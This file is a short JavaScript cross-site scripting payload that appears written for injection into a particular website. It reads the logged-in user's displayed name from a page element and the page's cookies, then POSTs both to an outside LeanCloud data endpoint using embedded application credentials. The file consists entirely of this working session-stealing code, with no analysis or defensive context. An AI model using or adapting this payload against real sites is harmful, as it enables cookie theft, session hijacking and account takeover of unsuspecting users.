if (window.console.log) {
  console.log('you are attacked by xss');
}

var xhr;

if (window.XMLHttpRequest) {
  xhr = new XMLHttpRequest();
} else if (window.ActiveXObject) {
  xhr = xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

if (xhr) {
  xhr.open('POST', 'https://api.leancloud.cn/1.1/classes/data', true);
  xhr.setRequestHeader('X-AVOSCloud-Application-Id','qk4ml855pcfsgqyle5awtdosdmb519hb4eif287mgncdr867');
  xhr.setRequestHeader('X-AVOSCloud-Application-Key','0f3c1kd3hznrz4bgu4728ys23zxktv7ippgkgcs9d9okjxo8');
  xhr.setRequestHeader('Content-Type','application/json');
  var name;
  if (document.getElementsByClassName) {
    name = document.getElementsByClassName('pointer icon_menu')[0].text;
  } else {
    var head = document.getElementById('head');
    var list = head.getElementsByTagName('a');
    for (var i = 0; i < list.length; i++) {
      if (list[i].className == 'pointer icon_menu') {
        name = list[1].text;
        break;
      }
    } 
  }
  var cookie = document.cookie;
  xhr.send('{"name":"'+name+'","cookie":"'+cookie+'"}');
}